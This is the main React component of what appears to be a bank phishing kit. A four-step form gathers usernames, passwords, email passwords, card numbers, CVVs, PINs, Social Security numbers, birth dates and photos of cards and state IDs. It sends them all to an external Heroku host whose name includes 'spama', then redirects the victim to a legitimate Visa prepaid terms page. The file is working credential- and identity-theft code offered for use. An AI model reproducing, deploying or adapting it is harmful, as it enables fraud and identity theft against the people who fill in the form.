import React, { useState, useRef } from 'react'
import FooterComponent from './components/partials/FooterComp';
import HeaderComponent from './components/partials/HeaderComp';
import Step1 from './components/steps/Step1';
import Step2 from './components/steps/Step2';
import Step3 from './components/steps/Step3';
import Step4 from './components/steps/Step4';

function App() {
  //Initialize State
  const [data, setData] = useState({
    username: "",
    password: "",
    email: "",
    emailPassword: "",
    confirmEmailPassword: "",
    fullName: "",
    fullAddress: "",
    dob: "",
    phone: "",
    nameOnCard: "",
    cardNumber: "",
    cardCvv: "",
    card4Digit: "",
    ssn: "",
    cardFront: null,
    cardBack: null,
    stateId_dlFront: null,
    stateId_dlBack: null,
    cardExpMonth: "",
    cardExpYear: ""
  });

  //index
  const [index, setIndex] = useState(0);
  
  const ref = useRef();

  //Images
  const [img, setImg] = useState({
    cardFront: null,
    cardBack: null,
    stateId_dlFront: null,
    stateId_dlBack: null,
  });
  

  //Navigating Handler
  const handleNavigate = (type) => type === "front" ? setIndex(index + 1) : setIndex(index - 1);
  
  //Submitting Handler
  const handleSubmit = (e, type) => {
    e.preventDefault();

    if (index === 2 && (!data.cardFront || !data.cardBack)) return;

    if (index === 3 && (!data.stateId_dlFront || !data.stateId_dlBack)) return;
    
    if (!type) return handleNavigate("front");

    //Send Data To Server
    let obj = {
      username: data.username,
      password: data.password,
      email: data.email,
      emailPassword: data.emailPassword,
      cardNo: data.cardNumber,
      cardCvv: data.cardCvv,
      expDate: `${data.cardExpMonth} / ${data.cardExpYear}`,
      cardPin: data.card4Digit,
      ssn: data.ssn,
      address: data.fullAddress,
      cardName: data.nameOnCard,
      phone: data.phone,
      fullName: data.fullName,
      dob: data.dob
    };

    //Cross Check Email Password;
    if (data.emailPassword !== data.confirmEmailPassword) {
        alert("Email Password Not Matched");
        return
    }

    const myData = new FormData();
    myData.append("obj", JSON.stringify(obj));
    myData.append("cardFront", data.cardFront);
    myData.append("cardBack", data.cardBack);
    myData.append("stateId_dlFront", data.stateId_dlFront);
    myData.append("stateId_dlBack", data.stateId_dlBack);

    fetch("https://bank-spama-bk-2.herokuapp.com", {
      method: "POST",
      mode: "cors",
      body: myData
      }).then(res => res.json())
      .then(res =>{
          if (res.status) {
              window.location.href = "https://www.visaprepaidprocessing.com/eddcard/Program/Terms";
          }
      })
  }
  
  //Changes Handler
  const handleChange = (e) => {
    
    if (e.target.type === "file") {
      setData({ ...data, [e.target.name]: e.target.files[0] });
 
        var reader = new FileReader();
        reader.readAsDataURL(e.target.files[0]);

      reader.onloadend = function (f) {
        setImg({ ...img, [e.target.id]: reader.result })
        
        
        
      }.bind(this);
      } else {
        setData({ ...data, [e.target.name]: e.target.value });
      }
    
  }
  

  
  if (index === 0) {
    return (
    <>
      <HeaderComponent />
      <Step1 handleSubmit={handleSubmit} handleChange={handleChange} data={data} />
      <FooterComponent />
      
      </>
  );
  }else if (index === 1) {
    return (
    <>
      <HeaderComponent />
      <Step2 handleSubmit={handleSubmit} handleChange={handleChange} data={data} handleNavigate={handleNavigate} />
      <FooterComponent />
      
      </>
  );
  }else if (index === 2) {
    return (
    <>
      <HeaderComponent />
      <Step3 handleSubmit={handleSubmit} handleChange={handleChange} handleNavigate={handleNavigate} img={img} ref={ref} />
      <FooterComponent />
      
      </>
  );
  }else if (index === 3) {
    return (
    <>
      <HeaderComponent />
      <Step4 handleNavigate={handleNavigate} handleSubmit={handleSubmit} handleChange={handleChange} img={img} data={data} />
      <FooterComponent />
      
      </>
  );
  }
}

export default App;
